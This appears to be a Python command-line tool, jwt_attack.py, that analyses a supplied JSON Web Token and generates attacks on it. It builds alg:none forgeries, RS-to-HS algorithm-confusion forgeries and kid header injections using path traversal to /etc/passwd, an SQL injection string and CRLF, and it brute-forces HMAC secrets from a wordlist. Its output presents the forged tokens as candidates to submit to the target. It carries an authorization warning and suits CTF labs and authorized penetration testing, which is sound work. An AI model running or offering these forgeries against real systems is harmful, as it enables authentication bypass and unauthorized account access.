#!/usr/bin/env python3
"""
jwt_attack.py — JWT vulnerability checker / educational attack tool.

Probes a JWT for the classic vulnerability classes:

  1. alg:none acceptance       — generates an unsigned forgery
  2. Weak HMAC secret          — bruteforces HS256/384/512 against a wordlist
  3. Algorithm confusion       — generates RS-to-HS confusion candidates
  4. kid injection             — generates kid path-traversal / SQLi probes
  5. Missing/weak claims       — flags missing exp, iss, aud, sub
  6. Sensitive claims          — flags credentials/PII inside the payload

Operates ONLY on tokens you provide. Does NOT make any network requests on
its own. Pair with Burp / curl to actually submit forgeries.

⚠️ AUTHORIZATION REQUIRED ⚠️
Submitting forged JWTs to systems you don't own/operate is unauthorized
access. This tool is for learning, CTF labs, and authorized engagements.

Usage:
    python3 jwt_attack.py "$TOKEN"
    python3 jwt_attack.py "$TOKEN" --wordlist rockyou.txt
    python3 jwt_attack.py "$TOKEN" --forge-none
    python3 jwt_attack.py "$TOKEN" --rsa-pubkey pubkey.pem    # alg-confusion
    python3 jwt_attack.py "$TOKEN" --json -o report.json
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import sys
from dataclasses import dataclass, field, asdict
from typing import Iterable

SUSPICIOUS_CLAIMS = [
    "password", "passwd", "secret", "token", "api_key", "apikey",
    "credit_card", "ssn", "private_key",
]
RECOMMENDED_CLAIMS = ["exp", "iss", "aud", "sub", "iat", "nbf"]


@dataclass
class Finding:
    severity: str    # info / low / medium / high / critical
    category: str
    detail: str


@dataclass
class Report:
    raw: str
    valid_format: bool
    header: dict | None = None
    payload: dict | None = None
    signature_b64: str | None = None
    findings: list[Finding] = field(default_factory=list)
    forgeries: dict[str, str] = field(default_factory=dict)
    cracked_secret: str | None = None


def b64url_decode(data: str) -> bytes:
    data = data + "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data.encode())


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def parse_jwt(token: str) -> tuple[dict | None, dict | None, str | None, str | None]:
    parts = token.strip().split(".")
    if len(parts) != 3:
        return None, None, None, "JWT does not have 3 parts"
    try:
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
    except (ValueError, json.JSONDecodeError) as e:
        return None, None, None, f"Could not decode header/payload: {e}"
    return header, payload, parts[2], None


def sign_hs(header_b64: str, payload_b64: str, secret: bytes, alg: str) -> str:
    digestmods = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    mac = hmac.new(secret, f"{header_b64}.{payload_b64}".encode(), digestmods[alg]).digest()
    return b64url_encode(mac)


def crack_hs_secret(token: str, wordlist: Iterable[str], alg: str) -> str | None:
    parts = token.split(".")
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    target_sig = parts[2]
    digestmods = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    if alg not in digestmods:
        return None
    digestmod = digestmods[alg]
    for raw in wordlist:
        word = raw.rstrip("\n")
        sig = b64url_encode(hmac.new(word.encode(), signing_input, digestmod).digest())
        if hmac.compare_digest(sig, target_sig):
            return word
    return None


def forge_alg_none(header: dict, payload: dict) -> str:
    new_header = dict(header)
    new_header["alg"] = "none"
    h = b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."


def forge_alg_none_capitalized(header: dict, payload: dict) -> dict[str, str]:
    """Some libraries are case-sensitive; try all variants."""
    out = {}
    for variant in ("none", "None", "NONE", "nOnE"):
        nh = dict(header)
        nh["alg"] = variant
        h = b64url_encode(json.dumps(nh, separators=(",", ":")).encode())
        p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        out[variant] = f"{h}.{p}."
    return out


def forge_alg_confusion(header: dict, payload: dict, public_key_pem: bytes) -> str:
    """RS->HS confusion: sign with public key as HMAC secret."""
    nh = dict(header)
    nh["alg"] = "HS256"
    h = b64url_encode(json.dumps(nh, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    sig = sign_hs(h, p, public_key_pem, "HS256")
    return f"{h}.{p}.{sig}"


def forge_kid_probes(header: dict, payload: dict) -> dict[str, str]:
    """Generate JWTs with various kid injection probes (LFI/SQLi/empty key)."""
    probes = {
        "kid=/dev/null (sign with empty key)": "/dev/null",
        "kid traversal /etc/passwd": "../../../../../../etc/passwd",
        "kid SQLi": "1' UNION SELECT 'AAAA' --",
        "kid empty string": "",
        "kid CRLF": "x\r\nContent-Type: x",
    }
    out: dict[str, str] = {}
    p_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    for label, kid_value in probes.items():
        nh = dict(header)
        nh["alg"] = "HS256"
        nh["kid"] = kid_value
        h_b64 = b64url_encode(json.dumps(nh, separators=(",", ":")).encode())
        # Sign with empty key — assumes the worst case where kid resolves to empty file
        sig = sign_hs(h_b64, p_b64, b"", "HS256")
        out[label] = f"{h_b64}.{p_b64}.{sig}"
    return out


def analyze_claims(payload: dict, findings: list[Finding]) -> None:
    flat = json.dumps(payload, default=str).lower()
    for s in SUSPICIOUS_CLAIMS:
        if s in flat:
            findings.append(
                Finding(
                    severity="high",
                    category="sensitive_claim",
                    detail=f"Payload appears to contain {s!r} — JWT claims are NOT encrypted, only signed.",
                )
            )
    for c in RECOMMENDED_CLAIMS:
        if c not in payload:
            findings.append(
                Finding(
                    severity="low" if c in ("nbf", "iat") else "medium",
                    category="missing_claim",
                    detail=f"Recommended claim {c!r} is missing.",
                )
            )

    # Check exp specifically
    exp = payload.get("exp")
    if exp is not None:
        try:
            exp_int = int(exp)
            from datetime import datetime, timezone
            exp_dt = datetime.fromtimestamp(exp_int, timezone.utc)
            now = datetime.now(timezone.utc)
            if exp_dt < now:
                findings.append(
                    Finding(
                        severity="info",
                        category="expired",
                        detail=f"Token already expired ({exp_dt.isoformat()}).",
                    )
                )
            elif (exp_dt - now).total_seconds() > 86400 * 30:
                findings.append(
                    Finding(
                        severity="medium",
                        category="long_lived",
                        detail=f"Token has very long expiry ({(exp_dt - now).days} days).",
                    )
                )
        except (TypeError, ValueError):
            findings.append(
                Finding(severity="medium", category="bad_exp", detail=f"exp is not numeric: {exp!r}")
            )


def analyze_header(header: dict, findings: list[Finding]) -> None:
    alg = header.get("alg", "").upper()
    if alg in ("NONE", ""):
        findings.append(
            Finding(severity="critical", category="alg_none", detail=f"Header advertises alg={alg!r}.")
        )
    elif alg.startswith("HS"):
        findings.append(
            Finding(
                severity="info",
                category="hmac_alg",
                detail=f"Symmetric HMAC ({alg}) — vulnerable to brute-force if secret is weak.",
            )
        )
    if "jku" in header:
        findings.append(
            Finding(
                severity="high",
                category="jku_header",
                detail="Token has a 'jku' header — if server fetches from jku without strict allowlist, key injection is possible.",
            )
        )
    if "jwk" in header:
        findings.append(
            Finding(
                severity="high",
                category="jwk_header",
                detail="Token embeds a 'jwk' — if server uses it for verification, attacker can sign with their own key.",
            )
        )
    if "kid" in header:
        findings.append(
            Finding(
                severity="medium",
                category="kid_present",
                detail="Token has 'kid' header — test for path-traversal / SQLi / empty-file injection.",
            )
        )
    if "x5u" in header:
        findings.append(
            Finding(
                severity="high",
                category="x5u_header",
                detail="Token has 'x5u' (cert URL) — analogous risk to jku.",
            )
        )


def main() -> int:
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("token", help="JWT to analyze")
    p.add_argument("-w", "--wordlist", help="Wordlist for HS-secret bruteforce")
    p.add_argument("--forge-none", action="store_true", help="Print alg:none forgery candidates")
    p.add_argument("--rsa-pubkey", help="PEM-encoded RSA public key for alg-confusion forgery")
    p.add_argument("--kid-probes", action="store_true", help="Generate kid-injection probe JWTs")
    p.add_argument("--json", action="store_true", help="Output JSON")
    p.add_argument("-o", "--output", help="Write JSON to file")
    args = p.parse_args()

    header, payload, sig_b64, err = parse_jwt(args.token)
    report = Report(raw=args.token, valid_format=err is None, header=header, payload=payload, signature_b64=sig_b64)

    if err:
        report.findings.append(Finding(severity="info", category="parse", detail=err))
    else:
        analyze_header(header or {}, report.findings)
        analyze_claims(payload or {}, report.findings)

        # Always offer alg:none forgeries (tiny, useful in JSON output too)
        if args.forge_none or args.json or args.output:
            for variant, tok in forge_alg_none_capitalized(header or {}, payload or {}).items():
                report.forgeries[f"alg:{variant}"] = tok

        if args.kid_probes or args.json or args.output:
            for label, tok in forge_kid_probes(header or {}, payload or {}).items():
                report.forgeries[label] = tok

        if args.rsa_pubkey:
            try:
                with open(args.rsa_pubkey, "rb") as f:
                    pub = f.read()
                # Try a couple of normalizations (with/without trailing newline)
                report.forgeries["alg_confusion_RS->HS256 (raw)"] = forge_alg_confusion(header or {}, payload or {}, pub)
                report.forgeries["alg_confusion_RS->HS256 (stripped)"] = forge_alg_confusion(header or {}, payload or {}, pub.strip())
                report.findings.append(
                    Finding(
                        severity="info",
                        category="alg_confusion",
                        detail="Generated RS-to-HS confusion forgeries; submit each to the target.",
                    )
                )
            except OSError as e:
                report.findings.append(Finding(severity="info", category="rsa_pubkey", detail=f"Could not read pubkey: {e}"))

        # Brute-force HMAC secret
        alg = (header or {}).get("alg", "").upper()
        if args.wordlist and alg in ("HS256", "HS384", "HS512"):
            try:
                with open(args.wordlist, encoding="utf-8", errors="ignore") as f:
                    secret = crack_hs_secret(args.token, f, alg)
                if secret is not None:
                    report.cracked_secret = secret
                    report.findings.append(
                        Finding(
                            severity="critical",
                            category="weak_secret",
                            detail=f"HS secret cracked: {secret!r}",
                        )
                    )
                else:
                    report.findings.append(
                        Finding(severity="info", category="hs_brute", detail="Secret not in wordlist.")
                    )
            except OSError as e:
                report.findings.append(Finding(severity="info", category="hs_brute", detail=f"Could not read wordlist: {e}"))

    # Output
    if args.json or args.output:
        payload_out = json.dumps(asdict(report), indent=2, default=str)
        if args.output:
            with open(args.output, "w", encoding="utf-8") as f:
                f.write(payload_out)
            print(f"[+] Wrote {args.output}", file=sys.stderr)
        else:
            print(payload_out)
    else:
        print("=== JWT Analysis ===")
        if not report.valid_format:
            print(f"[-] Could not parse: {err}")
            return 1
        print(f"\nHeader:   {json.dumps(report.header, indent=2)}")
        print(f"\nPayload:  {json.dumps(report.payload, indent=2, default=str)}")
        print(f"\nSignature (b64url): {sig_b64}")
        print("\n--- Findings ---")
        if not report.findings:
            print("  (none)")
        for f in report.findings:
            print(f"  [{f.severity.upper():9}] {f.category:18} {f.detail}")
        if report.cracked_secret:
            print(f"\n*** HS secret cracked: {report.cracked_secret!r} ***")
        if report.forgeries:
            print("\n--- Forgery candidates (test against the target) ---")
            for label, tok in report.forgeries.items():
                print(f"\n  # {label}")
                print(f"  {tok}")

    return 0


if __name__ == "__main__":
    sys.exit(main())
